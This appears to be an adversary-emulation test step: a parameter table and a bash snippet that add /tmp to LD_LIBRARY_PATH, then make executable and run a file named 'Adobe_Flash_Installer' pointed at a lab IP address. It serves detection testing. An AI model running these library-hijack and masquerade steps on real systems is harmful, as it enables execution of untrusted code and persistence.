<<parameters
Name	Description	Type	Default Value
file_folder	folder to the file	String	/tmp
file_name	file name	String	Adobe_Flash_Installer
parameter	parameter	String	-URL 192.168.57.101
library_path	library path	String	/tmp
parameters

if [ -z "${LD_LIBRARY_PATH}" ]; then
        export LD_LIBRARY_PATH="#{library_path}" && \
        echo "LD_LIBRARY_PATH environment variable set to #{library_path}"
else
        if [[ "${LD_LIBRARY_PATH}" == *"#{library_path}"* ]]; then
                echo "LD_LIBRARY_PATH already includes the library path #{library_path}."
        else
                export LD_LIBRARY_PATH="${LD_LIBRARY_PATH}:#{library_path}" && \
                echo "LD_LIBRARY_PATH environment variable updated to ${LD_LIBRARY_PATH}"
        fi
fi
chmod +x #{file_folder}/#{file_name}
#{file_folder}/#{file_name} #{parameter}
